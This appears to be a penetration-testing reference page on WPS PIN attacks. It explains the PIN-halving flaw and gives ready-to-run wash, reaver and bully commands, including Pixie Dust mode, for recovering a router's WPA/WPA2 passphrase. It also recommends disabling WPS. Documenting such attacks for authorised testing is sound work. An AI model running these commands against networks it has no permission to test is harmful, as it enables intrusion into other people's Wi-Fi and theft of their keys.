# WPS PIN Attacks (Reaver & Bully)

> Wi-Fi Protected Setup was meant to make joining a network easy — instead its
> 8-digit PIN can be brute-forced to recover the WPA/WPA2 passphrase regardless
> of how strong that passphrase is.

- **Link:** Reaver https://github.com/t6x/reaver-wps-fork-t6x · Bully https://github.com/aanarchyy/bully
- **Type:** open source
- **Platform:** Linux

## Description

WPS lets clients join a WPA/WPA2 network with an 8-digit PIN instead of the
passphrase. The flaw: the router validates the PIN in two halves and the last
digit is a checksum, so the search space collapses from 10^8 to roughly 11,000
attempts — recoverable in a few hours at most, **independent of passphrase
length**. Once the PIN is found, the access point simply hands over the plaintext
WPA/WPA2 key. `wash` finds WPS-enabled APs, `reaver` runs the online PIN brute
force (and the faster offline "Pixie Dust" attack), and `bully` is an
alternative implementation that's often more robust on flaky hardware.

## Installation

```bash
sudo apt install reaver bully        # Debian/Kali/Ubuntu (wash ships with reaver)
```

## Usage examples

### Find WPS-enabled access points

```bash
# Put the adapter in monitor mode first (see aircrack-ng.md)
sudo airmon-ng start wlan0

# List nearby APs that have WPS enabled and whether it's locked
sudo wash -i wlan0mon
```

### Reaver — online PIN brute force

```bash
# Classic online PIN attack against a target BSSID on a channel
sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -vv

# Pixie Dust — offline attack against vulnerable chipsets (seconds, not hours)
sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -K 1 -vv
```

### Bully — alternative implementation

```bash
# Run a PIN attack with bully
sudo bully wlan0mon -b <AP_BSSID> -c <CHANNEL>

# Bully's Pixie Dust mode
sudo bully wlan0mon -b <AP_BSSID> -c <CHANNEL> -d
```

## Notes & references

- Try **Pixie Dust first** — if the chipset is vulnerable it recovers the PIN
  almost instantly and offline; fall back to the online brute force otherwise.
- Modern routers **rate-limit or lock WPS** after too many failed attempts
  (`wash` shows a locked state). A locked AP may need hours of cooldown between
  attempts, or may be effectively immune.
- The fix is simple: **disable WPS**. Recommend it in every report.
- Wifite automates WPS attacks end to end — see [Wifite](wifite.md).
- Related: capture the handshake directly with [Aircrack-ng](aircrack-ng.md),
  or read the [Wi-Fi security overview](wifi-security-overview.md).
